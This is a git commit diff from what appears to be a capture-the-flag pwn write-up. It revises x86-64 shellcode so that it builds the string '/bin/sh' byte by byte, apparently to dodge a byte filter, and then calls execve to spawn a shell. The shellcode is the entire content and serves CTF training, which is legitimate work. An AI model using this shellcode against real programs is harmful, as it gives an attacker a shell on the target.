4ab56ff9a3eae2ee6a838b9761426c580b779228
Jacute <you@example.com>
2024-06-24 14:44:28 +0700

    update shellcode pwn | sh3llc0d3r

--- pwn/sh3llc0d3r/writeup/shellcode/shell.s
+++ pwn/sh3llc0d3r/writeup/shellcode/shell.s
@@ -6,10 +6,30 @@ _start:
     xor rsi, rsi
     xor rdx, rdx
 
-    mov rax, 0x0067732f6e69622f
-    mov rbx, 0x0001000000000000
-    add rax, rbx
-    push rax
-    mov rax, 59
+    ; mov rax, 0x0067732f6e69622f
+    ; mov rbx, 0x0001000000000000
+    ; add rax, rbx
+    xor rbx, rbx
+
+    mov bl, 0x67
+    inc bl
+    shl rbx, 8
+
+    mov bl, 0x73
+    shl rbx, 8
+
+    mov bl, 0x2f
+    shl rbx, 8
+    mov bl, 0x6e
+    shl rbx, 8
+    mov bl, 0x69
+    shl rbx, 8
+    mov bl, 0x62
+    shl rbx, 8
+    mov bl, 0x2f
+
+    push rbx
+    mov rax, rdx
+    mov al, 59
     mov rdi, rsp
     syscall
